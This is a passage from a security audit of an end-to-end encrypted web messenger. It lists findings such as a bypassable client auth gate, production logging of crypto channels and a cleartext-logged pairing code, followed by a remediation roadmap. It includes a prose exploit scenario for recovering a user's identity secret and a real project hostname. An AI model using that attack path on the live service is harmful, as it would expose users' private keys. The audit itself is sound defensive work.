- **Affected:** `messaging/views/messenger.html:318-321` (init calls only `MessengerController.init()`; `authGuard.js` is loaded `:155` but never called); auth gate `messengerController.js:61-73` loops on `AuthService.isAuthenticated()` (`authService.js:860-862`, pure in-memory `currentUser !== null && session !== null`)

**Description.** The protected page never calls `AuthGuard.checkAuth()`/`protectRoute()` (which does a real `getSession()` round-trip). Its only gate is an in-memory check, trivially defeated by stubbing `AuthService.currentUser`/`session`. RLS remains the authoritative control (no protected DATA is exposed), so this is a defense-in-depth gap, but the client gate offers no real protection and is inconsistent with the documented `AuthGuard` design.

**Remediation.** Gate `messenger.html` through `AuthGuard.protectRoute()`/`checkAuth()` before initializing the controller; treat the in-memory check as advisory; keep RLS authoritative.

---

#### SM-46 — Verbose logging hard-enabled in shipped config (`ENABLE_ALL_LOGS = true`), crypto prefixes whitelisted

- **Severity:** Low *(the key-material leak it enables is escalated under SM-07; this finding tracks the config defect and the broader metadata it exposes)*
- **Category:** Config / logging defaults
- **Affected:** `shared/config/loggingConfig.js:13` (`ENABLE_ALL_LOGS = true`), `:16` (`LOG_FILTER_MODE = 'filter'`), `:20-41` (`ALLOWED_PREFIXES` includes `[KeyManagementService]`, `[CryptoService]`, `[KeyStorageService]`, `[KeyManager]`, `[DevicePairing`, `[MessagingService]`, ...); no hostname/env gate; every service uses raw `console.*`, not the production-gated `Logger`
- **Merged from:** supply-chain (ENABLE_ALL_LOGS) + info-leak-logging (verbose logging ON in production). This is the root enabler that turns the other logging findings from "debug-only" into "live in prod."

**Description.** The global console override defaults logging ON in `filter` mode with the crypto/messaging prefixes whitelisted, and has no environment/hostname check (unlike `logger.js`, which sets level `error` in production). Because every service logs via raw `console.*`, `loggingConfig` is the effective control, so the whitelisted channels print in a deployed production console. *Correction:* the `[AuthService]`/`[AuthGuard]` email/userId session-dump logs are **not** in `ALLOWED_PREFIXES`, so they are filtered out by default; the real production exposure is via the whitelisted crypto channels (key bytes — SM-07), the device-pairing code (SM-47), and message metadata (SM-48).

**Remediation.** Default `ENABLE_ALL_LOGS = false`; add an explicit env/hostname gate (enable verbose only on localhost like `logger.js`); remove all crypto/key/device prefixes from `ALLOWED_PREFIXES`; route all logging through the production-gated `Logger` and have it redact known-sensitive arguments.

---

#### SM-47 — Device-pairing 6-digit code logged in cleartext (and stored plaintext in DB)

- **Severity:** Low *(one source rated this medium/high; consolidated at low — the leak requires console/DB access and the code is 5-min single-use; escalate to high if your threat model includes console-capturing tooling)*
- **Category:** Secret logging
- **Affected:** `messaging/services/devicePairingService.js:19` (`console.log('[DevicePairingService] Generated pairing code:', code)`), `:70` (logged again); plaintext `pairing_code` column `messaging-schema.sql:284`; also embedded in `device_id` `devicePairingService.js:44`; the `[DevicePairing` prefix is whitelisted (`loggingConfig.js:29`) so it prints in production

**Description.** The pairing code — the sole secret protecting the identity secret key (SM-06) — is logged twice in cleartext and persisted in plaintext in `pairing_code` (and again inside `device_id`). *Correction to the original report:* `loggingConfig` is an allow-list, not a redaction list; the code prints **because** `[DevicePairing` is whitelisted, not because it is absent from a deny-list.

**Exploit scenario.** A console reader/capturing extension (or a DB/backup reader) obtains the code within the 5-minute window, calls `verifyPairingCode(userId, code)` (userId is in adjacent logs / world-readable), pulls `encrypted_secret_key`, and decrypts the identity secret.

**Remediation.** Remove the code from all log statements (`:19`, `:70`) — log only a boolean that a code was generated. Do not store the raw `pairing_code` (store a salted hash for lookup, or look up by opaque request id and never persist the code); remove the code from `device_id`.

---

#### SM-48 — `getMessages` attaches per-message `_debugInfo` and logs participants/metadata; `_debugInfo` rides on returned objects

- **Severity:** Low *(verdict-adjusted medium; consolidated at low as a metadata-only leak — no plaintext/keys)*
- **Category:** Information leakage
- **Affected:** `messaging/services/messagingService.js:40` (participant pair), `:87` (send metadata), `:225`/`:253` (counts/conversation ids), `:286` (raw decrypt error), `:296-302` (`_debugInfo` attached to every returned message)

**Description.** `MessagingService` logs (via raw `console.*`, bypassing the gated `Logger`) the social graph (every partner user id), message timing/volume, per-message epoch/counter, and raw decrypt error strings; `_debugInfo` is created unconditionally and attached to message objects in memory (rendered only when `window.ENCRYPTION_DEBUG_MODE` is set, but accessible to any in-page code/extension). No key bytes or plaintext.

**Remediation.** Route these through `Logger.debug` (localhost-gated) or remove them; log only opaque counts, never participant ids or counters. Guard `_debugInfo` creation behind `window.ENCRYPTION_DEBUG_MODE`.

---

#### SM-49 — `PasswordManager` logs full clear-call stack traces and password-handle age/lifecycle

- **Severity:** Low
- **Category:** Information leakage
- **Affected:** `shared/utils/passwordManager.js:31` (store), `:72` (retrieved-password age), `:95-99` (full `Error().stack` on every clear), `:180` (max lifetime). (`[PasswordManager]` is not whitelisted, so these are filtered out under the default `filter` mode — exposure occurs only if filter mode is widened.)

**Description.** The password value itself is never logged, but the clear-call stack traces and the retrieved-password age advertise exactly when the `sessionStorage` login password (SM-08) is live, narrowing the window an attacker must target. Marginal incremental value (an attacker with console access could already read `sessionStorage` directly).

**Remediation.** Remove the stack-trace and age logging (`:72`, `:95-97`); do not log presence/age/lifecycle of the password handle. Separately, reconsider storing the raw password in `sessionStorage` at all (SM-08).

---

### INFO (verified non-issues / advisories)

---

#### SM-50 — AES-GCM IV/salt generation reviewed and sound

- **Severity:** Info
- **Affected:** `encryption/services/passwordCryptoService.js:92-115` (random 32-byte salt + 96-bit IV per call); `keyBackupService.js:80-91` (independent encrypt calls)

Each `encryptWithPassword` call generates a fresh random salt and IV, and keys are PBKDF2-derived per (password, salt), so there is no AES-GCM IV-reuse-under-fixed-key risk. Encrypting the same plaintext under independently-derived keys leaks nothing beyond length. The session backup key is encrypted only under the password (not the recovery key), so recovery-key restore cannot recover session history — a usability limitation, not a confidentiality flaw. No change required; optionally also escrow the session-backup key under the recovery key as a feature.

---

#### SM-51 — Realtime publication broadcasts full rows; client filters are not a security control

- **Severity:** Info
- **Affected:** `database/setup/messaging-schema.sql:666-699` (`REPLICA IDENTITY FULL` + publication); client filters `messagingService.js:415`/`:444`

Supabase Realtime applies the table's RLS per subscriber, so the participant-scoped `messages_select_participant` gates delivery; the client `recipient_id`/`conversation_id` filters are convenience, not authorization. `REPLICA IDENTITY FULL` means the WAL carries every column (including `encrypted_content`) — increasing blast radius only if RLS-on-realtime is ever disabled or a SELECT policy is loosened. Keep RLS as the realtime boundary; consider `REPLICA IDENTITY DEFAULT` or a narrowed column list; add a test that the SELECT policy denies non-participants.

---

#### SM-52 — Attachment download inline `onclick` interpolates `attId` (not exploitable today)

- **Severity:** Info
- **Affected:** `messaging/controllers/messengerController.js:937, :998, :1115, :1500` (`onclick="...downloadAttachment(${attId})"`); `attId = att.id` (BIGSERIAL, `messaging-schema.sql:535`)

The id is a server-generated integer, never attacker-controllable, so this is not exploitable. The pattern is fragile (would break under CSP; becomes a sink if the id type ever changes). Remove the inline handler: render with `data-attachment-id` (already present) and a single delegated click listener that reads and integer-validates the id — this also enables a strict CSP that forbids inline handlers.

---

#### SM-53 — Real Supabase project ref leaked in git history and current tree; anon key committed historically

- **Severity:** Info *(reported low; treated as info/operational — no service-role key leaked)*
- **Affected:** git history `f4cee60` (`supabaseConfig.js:10` project ref; `:11` `sb_publishable_...` anon key); current tree leftovers `payments/config/moneyTrackerConfig.js:27`, `payments/controllers/{upgradeController,paymentController}.js`, `database/supabaseEdgeFunctions/stripe-webhook.ts:24`

The real project ref `ofutzrxfbrgtbkyafndv.supabase.co` is in git history **and** still present in current-tree payment leftovers from the money_tracker import; a real anon/publishable key (RLS-gated, safe-to-ship by design) was committed historically. No service-role/secret key is in any commit. Impact depends entirely on RLS quality (covered by SM-05/SM-14/SM-25 etc.). *Corrections to the original report:* (a) an anon key **was** committed (not "identifier-only"), and (b) the leak is not history-only — scrub the current-tree files too. Confirm the service-role key has been rotated since the import; keep URL/keys in env-injected config.

---

#### SM-54 — Deploy workflow publishes the entire repo root (source, edge `.ts`, RLS schema) to GitHub Pages

- **Severity:** Info *(reported low; recon-aiding, not a direct boundary break)*
- **Affected:** `.github/workflows/deploy.yml:45/:47` (`upload-pages-artifact` `path: '.'` instead of `./dist`); serves `database/supabaseEdgeFunctions/user-lookup.ts`, `database/setup/messaging-schema.sql`, internal READMEs, and all unminified `.js`

The deploy uploads the whole repo, serving the edge-function source and RLS schema publicly — lowering reconnaissance cost for the enumeration (SM-20) and RLS-gap (SM-05/SM-14) attacks. Most client code already ships to browsers and RLS is server-enforced, so exposure aids recon rather than directly breaking a boundary. Ensure `database/supabaseEdgeFunctions/**` and `database/setup/**` are never web-served; if you switch to `./dist`, note the entry HTML loads source via relative `<script src="../../...">` tags and an un-SRI'd CDN script, so HTML rewrites are needed for a true dist build.

---

## 3. Prioritized Remediation Roadmap

### Quick wins (hours–days, no protocol redesign)

These remove the most dangerous, cheapest-to-fix exposures:

1. **Strip key/secret logging and turn logging off in prod** (SM-07, SM-46, SM-47, SM-48, SM-49): delete byte-level key logs, set `ENABLE_ALL_LOGS = false`, remove crypto/device prefixes from `ALLOWED_PREFIXES`, gate by hostname, route through `Logger`.
2. **Escape every `innerHTML` interpolation** (SM-04, SM-17, SM-18, SM-27): one shared escaping node-builder for message content, sender email, attachment filename, and error messages.
3. **Add a strict CSP** to both HTML pages (SM-19): `script-src 'self'`, `connect-src 'self' https://<project>.supabase.co`, `object-src 'none'`, `frame-ancestors 'none'`.
4. **Fix the Storage bucket RLS** (SM-05, SM-33): scope SELECT/INSERT/DELETE/UPDATE to conversation membership + uploader; stop bucket-root listing. This closes the global attachment wipe.
5. **Stop leaking message plaintext to notifications** (SM-03): delete `messagePreview`; store metadata only.
6. **Vendor + SRI-pin TweetNaCl** (SM-11) and pin/SRI Supabase (SM-32).
7. **Enforce server-side block + consent** (SM-15, SM-25): RLS `SECURITY DEFINER` block check on `messages_insert_participant` and a friendship/not-blocked gate on conversation creation.
8. **Authorize the `user-lookup` edge function** (SM-20): verify a real (non-anon) JWT, add `config.toml` `verify_jwt`, lock CORS, replace `listUsers()` with an indexed lookup, rate-limit.
9. **Tighten `message_attachments` UPDATE** and **friends UPDATE `WITH CHECK`** (SM-30, SM-39); enforce password strength (SM-12); add message size limit (SM-22) and send/conversation rate limits (SM-23).
10. **Fix recovery-key format mismatch** (SM-13) and 32-byte validation (SM-38) so backups are actually recoverable; fix `registerDevice` (SM-31); fix `validateSession` (SM-44); gate `messenger.html` through `AuthGuard` (SM-45).
11. **Schedule attachment cleanup that deletes Storage objects** (SM-29); enforce `device_keys` expiry in RLS + scheduled delete (SM-21).

### Larger redesigns (the structural fixes)

These are the changes that make the E2EE claim true against the stated untrusted-server threat model:

1. **TOFU pinning + safety-number verification UI** (SM-01, SM-14, SM-24, SM-36). Persist and pin peer keys client-side; hard-fail on unexpected key changes; surface the already-implemented safety number and require out-of-band verification. Consider a key-transparency log. This is the single highest-value structural change.
2. **Double Ratchet / X3DH for forward secrecy** (SM-09, SM-10, SM-34). Replace static-static ECDH with ephemeral DH per session and a symmetric ratchet; erase used message keys; bind sender/conversation/counter as associated data; add a client-side monotonic counter high-water mark. This simultaneously fixes forward secrecy, post-compromise security, replay, and the deterministic-KDF concerns.
3. **Encrypt the identity secret at rest and stop exporting it** (SM-02, SM-16, SM-06, SM-21, SM-35). Store the private key as a non-extractable WebCrypto `CryptoKey`; never persist raw bytes; never transmit the long-term secret during pairing — use an authenticated device-to-device key exchange with a high-entropy out-of-band-confirmed secret and a memory-hard KDF.
4. **Remove the raw password from web storage** (SM-08): single-page-context backup/restore, in-memory key material only, zeroize on use.
5. **Harden backups**: Argon2id KDF (SM-12), always re-issue recovery escrow on re-encryption (SM-26).

---

## 4. What Is Already Done Well

The codebase has a genuine, non-trivial cryptographic core, and several zero-knowledge properties hold:

- **Real, modern primitives, correctly invoked.** X25519/XSalsa20-Poly1305 (TweetNaCl) for messaging and HKDF-SHA256 + PBKDF2-SHA256 (600k) + AES-256-GCM (Web Crypto) for backups are appropriate choices, and the AEAD is used with authenticated `secretbox.open` (tamper produces a clean failure).
- **AES-GCM IV/salt hygiene is sound** (SM-50): fresh 32-byte random salt and 96-bit random IV per encryption, with per-(password, salt) key derivation — no nonce-reuse-under-fixed-key risk, and random salts defeat precomputed rainbow tables.
- **The server genuinely does not hold the plaintext message bodies in the `messages` table** — those are stored as ciphertext, and the identity secret is wrapped (PBKDF2+AES-GCM) in the server-side backup. The backup design is correctly zero-knowledge *given a strong password*: the server cannot derive the key without it.
- **Table-level RLS for message/conversation/attachment metadata is correctly participant-scoped** (the gaps are specifically in Storage-object policies and the `is_encrypted`/notification/realtime edge cases, not the core row policies), and `device_keys`/`session_keys`/`blocked_users` are correctly owner-scoped.
- **The safety-number and key-rotation machinery already exists in code** — `generateSafetyNumber`, `getSafetyNumber`, epoch/counter plumbing — so the structural fixes (TOFU surfacing, ratcheting) build on existing scaffolding rather than starting from zero.
- **The realtime boundary correctly inherits RLS** (SM-51): client subscription filters are not relied on as authorization.

The foundation is solid; the work ahead is to make the protocol live up to the cryptography — authenticate keys, add forward secrecy, protect the secret at rest, and stop the plaintext/key leaks around the edges.

---

*End of report.*
